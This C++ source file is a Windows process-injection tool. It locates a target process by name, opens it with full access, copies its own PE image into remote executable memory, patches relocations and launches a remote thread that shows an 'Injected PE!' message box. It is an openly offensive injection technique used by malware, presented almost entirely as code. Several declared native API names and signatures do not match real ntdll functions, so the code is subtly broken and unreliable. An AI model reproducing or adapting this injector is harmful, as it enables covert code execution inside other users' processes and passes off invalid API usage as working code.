#include <windows.h>
#include <psapi.h>
#include <iostream>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

// Structure for describing a Unicode string
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWCHAR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// Structure for describing object attributes
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Size;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// Structure for the Client ID (Process and Thread IDs)
typedef struct _CLIENT_ID {
    HANDLE ProcessId;
    HANDLE ThreadId;
} CLIENT_ID, *PCLIENT_ID;

typedef LONG NT_STATUS;
#define NT_SUCCESS(Status) (((NT_STATUS)(Status)) >= 0)

// External declarations of NT functions
extern "C" {
    NT_STATUS NtOpenProcessHandle(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    );

    NT_STATUS NtAllocateMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protection
    );

    NT_STATUS NtWriteMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T SizeToWrite,
        PSIZE_T BytesWritten
    );

    NT_STATUS NtCreateThread(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartAddress,
        PVOID Argument,
        ULONG Flags,
        ULONG_PTR ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList
    );
}

// Function for error handling
void DisplayError(const char* function, NT_STATUS status) {
    std::cout << "[-] " << function << " failed, error code: 0x" << std::hex << status << std::endl;
}

// Function to open a process handle
HANDLE OpenProcessHandle(DWORD pid) {
    CLIENT_ID clientId;
    clientId.ProcessId = reinterpret_cast<HANDLE>(pid);
    clientId.ThreadId = nullptr;

    OBJECT_ATTRIBUTES objectAttributes;
    objectAttributes.Size = sizeof(OBJECT_ATTRIBUTES);
    objectAttributes.RootDirectory = nullptr;
    objectAttributes.ObjectName = nullptr;
    objectAttributes.Attributes = 0;
    objectAttributes.SecurityDescriptor = nullptr;
    objectAttributes.SecurityQualityOfService = nullptr;

    HANDLE processHandle = nullptr;
    NT_STATUS status = NtOpenProcessHandle(&processHandle, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
    if (!NT_SUCCESS(status)) {
        DisplayError("NtOpenProcessHandle", status);
        return nullptr;
    }

    return processHandle;
}

// Structure for Relocation Table entries
struct RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
};

typedef RELOCATION_ENTRY* PRELOCATION_ENTRY;

// Function to inject a message box into the target process
void InjectMessage() {
    MessageBoxA(nullptr, "Injected PE!", "Injection", MB_OK | MB_ICONEXCLAMATION);
}

// Class for handling PE headers
class PEHeaders {
public:
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeaders;
    IMAGE_OPTIONAL_HEADER optionalHeader;
    IMAGE_FILE_HEADER fileHeader;

    PEHeaders(PVOID imageBase) {
        dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(imageBase);
        ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(imageBase) + dosHeader->e_lfanew);
        optionalHeader = ntHeaders->OptionalHeader;
        fileHeader = ntHeaders->FileHeader;
    }
};

// Function to get the PID based on the process name
DWORD FindProcessId(const char* processName) {
    DWORD pids[1024], bytesReturned;
    if (!EnumProcesses(pids, sizeof(pids), &bytesReturned)) return 0;

    SIZE_T count = bytesReturned / sizeof(DWORD);
    for (SIZE_T i = 0; i < count; i++) {
        DWORD pid = pids[i];
        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProc) {
            HMODULE hModule;
            DWORD bytesNeeded;
            char name[MAX_PATH] = { 0 };
            if (EnumProcessModules(hProc, &hModule, sizeof(hModule), &bytesNeeded)) {
                GetModuleBaseNameA(hProc, hModule, name, sizeof(name));
                if (!_stricmp(name, processName)) {
                    CloseHandle(hProc);
                    return pid;
                }
            }
            CloseHandle(hProc);
        }
    }
    return 0;
}

// Main function for injection
int main(int argc, char* argv[]) {
    if (argc <= 1) {
        std::cout << "[*] Usage: inject.exe <PROCESS_NAME>" << std::endl;
        return 1;
    }

    DWORD pid = FindProcessId(argv[1]);
    if (!pid) {
        std::cout << "[-] Process not found." << std::endl;
        return 1;
    }

    HANDLE processHandle = OpenProcessHandle(pid);
    if (!processHandle) {
        std::cout << "[-] Unable to open process." << std::endl;
        return 1;
    }

    PVOID imageBase = GetModuleHandleA(nullptr);
    PEHeaders headers(imageBase);
    PVOID localImage = nullptr;
    SIZE_T imageSize = headers.optionalHeader.SizeOfImage;

    NT_STATUS status = NtAllocateMemory(GetCurrentProcess(), &localImage, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        DisplayError("NtAllocateMemory", status);
        return 1;
    }

    // Copy local image into allocated memory
    memcpy(localImage, imageBase, headers.optionalHeader.SizeOfImage);

    PVOID targetImage = nullptr;
    status = NtAllocateMemory(processHandle, &targetImage, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        DisplayError("NtAllocateMemory", status);
        return 1;
    }

    // Calculate the base address delta
    DWORD_PTR deltaBase = reinterpret_cast<DWORD_PTR>(targetImage) - reinterpret_cast<DWORD_PTR>(imageBase);

    // Adjust the base relocation table
    PIMAGE_BASE_RELOCATION relocationTable = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<DWORD_PTR>(localImage) + headers.optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    std::cout << "[+] Fixing relocations..." << std::endl;
    while (relocationTable->SizeOfBlock > 0) {
        DWORD relocationCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PRELOCATION_ENTRY relocationEntries = reinterpret_cast<PRELOCATION_ENTRY>(relocationTable + 1);
        for (DWORD i = 0; i < relocationCount; i++) {
            if (relocationEntries[i].Offset) {
                PDWORD_PTR fixAddress = reinterpret_cast<PDWORD_PTR>(reinterpret_cast<DWORD_PTR>(localImage) + relocationTable->VirtualAddress + relocationEntries[i].Offset);
                *fixAddress += deltaBase;
            }
        }
        relocationTable = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<DWORD_PTR>(relocationTable) + relocationTable->SizeOfBlock);
    }

    // Write the local image into the target process's memory
    status = NtWriteMemory(processHandle, targetImage, localImage, headers.optionalHeader.SizeOfImage, nullptr);
    if (!NT_SUCCESS(status)) {
        DisplayError("NtWriteMemory", status);
        return 1;
    }

    // Create a new thread to execute the injected message
    HANDLE threadHandle;
    status = NtCreateThread(&threadHandle, THREAD_ALL_ACCESS, nullptr, processHandle, reinterpret_cast<PVOID>(reinterpret_cast<DWORD_PTR>(&InjectMessage) + deltaBase), nullptr, 0, 0, 0, 0, nullptr);
    if (!NT_SUCCESS(status)) {
        DisplayError("NtCreateThread", status);
        return 1;
    }

    std::cout << "[+] Injection completed successfully!" << std::endl;
    return 0;
}
